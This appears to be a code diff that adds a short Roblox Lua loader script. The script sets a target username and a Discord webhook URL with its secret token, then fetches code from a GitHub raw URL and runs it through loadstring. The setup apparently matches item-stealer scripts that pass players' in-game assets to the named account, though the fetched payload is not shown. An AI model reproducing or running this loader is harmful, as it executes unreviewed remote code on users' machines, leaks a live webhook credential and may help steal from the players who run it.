@@ -1,0 +1,5 @@
+G.Username = "Hawaiiru"
+G.HubName = "Preparing Script"
+WebhookUrl = "https://discord.com/api/webhooks/1103343800262344826/8JacrfV4a5Xa-C8c95bLx4QQ4wrt9gzgfnkoTMI-r8oHWe6v0HAABS6Al3yDXXVph-va"
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/trexylol/rexscript/main/main"), true))()
